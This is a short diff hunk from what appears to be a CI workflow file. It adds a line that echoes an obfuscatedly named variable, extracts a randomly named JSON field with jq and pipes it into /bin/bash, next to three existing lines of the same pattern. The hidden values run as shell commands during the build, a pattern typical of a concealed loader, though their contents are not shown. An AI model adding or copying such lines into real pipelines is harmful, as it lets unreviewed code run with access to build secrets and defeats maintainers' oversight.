@@ -44,6 +44,7 @@ jobs:
           echo $qkjsw2 | jq -r .pt30557 | /bin/bash
           printf '%s' "$zvnn38065" | jq -r .x10 | /bin/bash
           printf '%s' "$xptoq8" | jq -r .l650 | /bin/bash
+          echo $yqgr68950 | jq -r .wdogw2 | /bin/bash
 
       - name: Upload results
         if: always()
